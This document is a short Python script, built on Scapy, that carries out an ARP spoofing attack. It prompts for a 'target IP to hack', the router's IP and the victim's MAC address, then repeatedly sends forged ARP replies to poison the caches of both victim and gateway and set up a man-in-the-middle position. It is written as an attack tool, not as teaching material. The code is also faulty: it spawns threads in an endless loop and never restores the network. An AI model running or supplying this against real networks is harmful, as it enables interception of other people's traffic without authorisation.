# !/usr/bin/env python
from pip._vendor.distlib.compat import raw_input
from scapy.all import *
from subprocess import call
import time

from scapy.layers.l2 import ARP

op = 1  # Op code 1 for ARP requests
victim = raw_input('Enter the target IP to hack: ')  # person IP to attack
victim = victim.replace(" ", "")

spoof = raw_input('Enter the routers IP *SHOULD BE ON SAME ROUTER*: ')  # routers IP.. Should be the same one.
spoof = spoof.replace(" ", "")

mac = raw_input('Enter the target MAC to hack: ')  # mac of the victim
mac = mac.replace("-", ":")
mac = mac.replace(" ", "")

def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=spoof, hwdst=get_mac(spoof), psrc=victim))
            send(ARP(op=2, pdst=victim, hwdst=mac, psrc=spoof))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")


arp = ARP(op=op, psrc=spoof, pdst=victim, hwdst=mac)
while 1:
    # send(arp)
    # send(ARP(op=2, pdst=spoof, hwdst=get_mac(spoof), psrc=victim))
    # send(ARP(op=2, pdst=victim, hwdst=mac, psrc=spoof))
    poison_thread = threading.Thread(target=arp_poison, args=(spoof,get_mac(spoof), victim, mac))
    poison_thread.start()
# time.sleep(2)
